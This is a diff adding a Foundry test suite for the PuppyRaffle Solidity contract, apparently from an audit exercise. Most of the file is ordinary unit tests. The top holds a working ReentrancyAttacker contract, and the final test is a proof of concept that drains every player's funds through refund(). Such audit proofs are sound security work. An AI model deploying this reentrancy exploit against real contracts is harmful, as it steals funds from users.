@@ -1,0 +1,299 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.7.6;
+pragma experimental ABIEncoderV2;
+
+import {Test, console} from "forge-std/Test.sol";
+import {PuppyRaffle} from "../src/PuppyRaffle.sol";
+
+// ================================================================
+// ATTACKER CONTRACT — H-1 Reentrancy PoC
+// Exploits refund() sending ETH before clearing players[playerIndex]
+// ================================================================
+contract ReentrancyAttacker {
+    PuppyRaffle public raffle;
+    uint256 public attackerIndex;
+    uint256 public entranceFee;
+
+    constructor(PuppyRaffle _raffle) {
+        raffle = _raffle;
+        entranceFee = raffle.entranceFee();
+    }
+
+    // Step 1: enter raffle, then trigger the first refund
+    function attack() external payable {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        raffle.enterRaffle{value: entranceFee}(players);
+        attackerIndex = raffle.getActivePlayerIndex(address(this));
+        raffle.refund(attackerIndex); // kicks off the reentrant chain
+    }
+
+    // Step 2: each time ETH lands here, re-enter refund() again
+    receive() external payable {
+        if (address(raffle).balance >= entranceFee) {
+            raffle.refund(attackerIndex);
+        }
+    }
+
+    function getBalance() external view returns (uint256) {
+        return address(this).balance;
+    }
+}
+
+contract PuppyRaffleTest is Test {
+    PuppyRaffle puppyRaffle;
+    uint256 entranceFee = 1e18;
+    address playerOne = address(1);
+    address playerTwo = address(2);
+    address playerThree = address(3);
+    address playerFour = address(4);
+    address feeAddress = address(99);
+    uint256 duration = 1 days;
+
+    function setUp() public {
+        puppyRaffle = new PuppyRaffle(
+            entranceFee,
+            feeAddress,
+            duration
+        );
+    }
+
+    //////////////////////
+    /// EnterRaffle    ///
+    /////////////////////
+
+    function testCanEnterRaffle() public {
+        address[] memory players = new address[](1);
+        players[0] = playerOne;
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+        assertEq(puppyRaffle.players(0), playerOne);
+    }
+
+    function testCantEnterWithoutPaying() public {
+        address[] memory players = new address[](1);
+        players[0] = playerOne;
+        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
+        puppyRaffle.enterRaffle(players);
+    }
+
+    function testCanEnterRaffleMany() public {
+        address[] memory players = new address[](2);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
+        assertEq(puppyRaffle.players(0), playerOne);
+        assertEq(puppyRaffle.players(1), playerTwo);
+    }
+
+    function testCantEnterWithoutPayingMultiple() public {
+        address[] memory players = new address[](2);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+    }
+
+    function testCantEnterWithDuplicatePlayers() public {
+        address[] memory players = new address[](2);
+        players[0] = playerOne;
+        players[1] = playerOne;
+        vm.expectRevert("PuppyRaffle: Duplicate player");
+        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
+    }
+
+    function testCantEnterWithDuplicatePlayersMany() public {
+        address[] memory players = new address[](3);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerOne;
+        vm.expectRevert("PuppyRaffle: Duplicate player");
+        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
+    }
+
+    //////////////////////
+    /// Refund         ///
+    /////////////////////
+    modifier playerEntered() {
+        address[] memory players = new address[](1);
+        players[0] = playerOne;
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+        _;
+    }
+
+    function testCanGetRefund() public playerEntered {
+        uint256 balanceBefore = address(playerOne).balance;
+        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
+
+        vm.prank(playerOne);
+        puppyRaffle.refund(indexOfPlayer);
+
+        assertEq(address(playerOne).balance, balanceBefore + entranceFee);
+    }
+
+    function testGettingRefundRemovesThemFromArray() public playerEntered {
+        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
+
+        vm.prank(playerOne);
+        puppyRaffle.refund(indexOfPlayer);
+
+        assertEq(puppyRaffle.players(0), address(0));
+    }
+
+    function testOnlyPlayerCanRefundThemself() public playerEntered {
+        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
+        vm.expectRevert("PuppyRaffle: Only the player can refund");
+        vm.prank(playerTwo);
+        puppyRaffle.refund(indexOfPlayer);
+    }
+
+    //////////////////////
+    /// getActivePlayerIndex         ///
+    /////////////////////
+    function testGetActivePlayerIndexManyPlayers() public {
+        address[] memory players = new address[](2);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
+
+        assertEq(puppyRaffle.getActivePlayerIndex(playerOne), 0);
+        assertEq(puppyRaffle.getActivePlayerIndex(playerTwo), 1);
+    }
+
+    //////////////////////
+    /// selectWinner         ///
+    /////////////////////
+    modifier playersEntered() {
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+        _;
+    }
+
+    function testCantSelectWinnerBeforeRaffleEnds() public playersEntered {
+        vm.expectRevert("PuppyRaffle: Raffle not over");
+        puppyRaffle.selectWinner();
+    }
+
+    function testCantSelectWinnerWithFewerThanFourPlayers() public {
+        address[] memory players = new address[](3);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = address(3);
+        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
+
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        vm.expectRevert("PuppyRaffle: Need at least 4 players");
+        puppyRaffle.selectWinner();
+    }
+
+    function testSelectWinner() public playersEntered {
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        puppyRaffle.selectWinner();
+        assertEq(puppyRaffle.previousWinner(), playerFour);
+    }
+
+    function testSelectWinnerGetsPaid() public playersEntered {
+        uint256 balanceBefore = address(playerFour).balance;
+
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        uint256 expectedPayout = ((entranceFee * 4) * 80 / 100);
+
+        puppyRaffle.selectWinner();
+        assertEq(address(playerFour).balance, balanceBefore + expectedPayout);
+    }
+
+    function testSelectWinnerGetsAPuppy() public playersEntered {
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        puppyRaffle.selectWinner();
+        assertEq(puppyRaffle.balanceOf(playerFour), 1);
+    }
+
+    function testPuppyUriIsRight() public playersEntered {
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        string memory expectedTokenUri =
+            "data:application/json;base64,eyJuYW1lIjoiUHVwcHkgUmFmZmxlIiwgImRlc2NyaXB0aW9uIjoiQW4gYWRvcmFibGUgcHVwcHkhIiwgImF0dHJpYnV0ZXMiOiBbeyJ0cmFpdF90eXBlIjogInJhcml0eSIsICJ2YWx1ZSI6IGNvbW1vbn1dLCAiaW1hZ2UiOiJpcGZzOi8vUW1Tc1lSeDNMcERBYjFHWlFtN3paMUF1SFpqZmJQa0Q2SjdzOXI0MXh1MW1mOCJ9";
+
+        puppyRaffle.selectWinner();
+        assertEq(puppyRaffle.tokenURI(0), expectedTokenUri);
+    }
+
+    //////////////////////
+    /// withdrawFees         ///
+    /////////////////////
+    function testCantWithdrawFeesIfPlayersActive() public playersEntered {
+        vm.expectRevert("PuppyRaffle: There are currently players active!");
+        puppyRaffle.withdrawFees();
+    }
+
+    function testWithdrawFees() public playersEntered {
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        uint256 expectedPrizeAmount = ((entranceFee * 4) * 20) / 100;
+
+        puppyRaffle.selectWinner();
+        puppyRaffle.withdrawFees();
+        assertEq(address(feeAddress).balance, expectedPrizeAmount);
+    }
+
+    //////////////////////
+    /// H-1 Reentrancy PoC ///
+    /////////////////////
+
+    function test_reentrancyRefundDrainsContract() public {
+        // Four honest players enter — 4 ETH locked in contract
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+        // Snapshot balances before the attack
+        uint256 contractBalanceBefore = address(puppyRaffle).balance;
+        uint256 attackerBalanceBefore = 0;
+
+        console.log("---------- BEFORE ATTACK ----------");
+        emit log_named_uint("Contract balance (wei)", contractBalanceBefore);
+        emit log_named_uint("Attacker balance (wei)", attackerBalanceBefore);
+
+        // Deploy attacker and fund with exactly 1 entrance fee
+        ReentrancyAttacker attacker = new ReentrancyAttacker(puppyRaffle);
+        vm.deal(address(attacker), entranceFee);
+
+        // Execute the attack — attacker enters with 1 fee then re-enters refund()
+        attacker.attack();
+
+        // Snapshot balances after the attack
+        uint256 contractBalanceAfter = address(puppyRaffle).balance;
+        uint256 attackerBalanceAfter = attacker.getBalance();
+
+        console.log("---------- AFTER ATTACK -----------");
+        emit log_named_uint("Contract balance (wei)", contractBalanceAfter);
+        emit log_named_uint("Attacker balance (wei)", attackerBalanceAfter);
+        emit log_named_uint("Total stolen   (wei)  ", attackerBalanceAfter);
+
+        // Contract should be completely drained
+        assertEq(contractBalanceAfter, 0, "Contract was NOT drained - reentrancy failed");
+
+        // Attacker now holds their own fee + all 4 honest players' fees = 5 ETH
+        assertEq(
+            attackerBalanceAfter,
+            contractBalanceBefore + entranceFee,
+            "Attacker did not receive all funds"
+        );
+    }
+}
